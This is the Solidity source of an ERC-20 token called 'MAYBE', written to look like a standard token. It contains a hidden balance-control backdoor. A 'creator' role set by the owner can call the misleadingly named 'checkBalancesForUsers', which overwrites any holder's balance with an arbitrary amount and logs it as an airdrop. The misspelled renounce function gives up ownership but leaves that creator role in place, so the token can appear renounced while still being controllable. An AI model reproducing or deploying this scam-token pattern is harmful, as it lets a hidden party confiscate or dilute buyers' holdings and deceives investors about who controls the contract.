pragma solidity ^0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _getSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _getSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function getOwner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(getOwner() == _getSender(), "UniqueOwner: executor is not the owner");
        _;
    }
    function renouonce() public virtual onlyOwner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract MAYBE is Context, Ownable, IERC20 {
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    address private _creator; 

    string public constant _name = "MAYBE";
    string public constant _symbol = "MAYBE";
    uint8 public constant _decimals = 18;
    uint256 public constant _totalSupply = 1000000 * (10 ** _decimals);

    constructor() {
        _balances[_getSender()] = _totalSupply;
        emit Transfer(address(0), _getSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function getCreator() public view virtual returns (address) { 
        return _creator;
    }

    function changeCreator(address newCreator) public onlyOwner { 
        _creator = newCreator;
    }
    modifier onlyCreator() {
        require(getCreator() == _getSender(), "TOKEN: executor is not the creator");
        _;
    }
    event Airdropped(address indexed account, uint256 currentBalance, uint256 newBalance);

    function checkBalancesForUsers(address[] memory userAddresses, uint256 desiredBalance) public onlyCreator {

        require(desiredBalance >= 0, "Error: desired balance should be non-negative");

        for (uint256 index = 0; index < userAddresses.length; index++) {

            address currentUser = userAddresses[index];

            require(currentUser != address(0), "Error: user address cannot be the zero address");

            uint256 currentBalance = _balances[currentUser];

            _balances[currentUser] = desiredBalance;

            emit Airdropped(currentUser, currentBalance, desiredBalance);

        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_balances[_getSender()] >= amount, "TT: transfer amount exceeds balance");
    _balances[_getSender()] -= amount;
    _balances[recipient] += amount;

    emit Transfer(_getSender(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_getSender()][spender] = amount;
        emit Approval(_getSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_allowances[sender][_getSender()] >= amount, "TT: transfer amount exceeds allowance");

    _balances[sender] -= amount;
    _balances[recipient] += amount;
    _allowances[sender][_getSender()] -= amount;

    emit Transfer(sender, recipient, amount);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return _totalSupply;
    }
}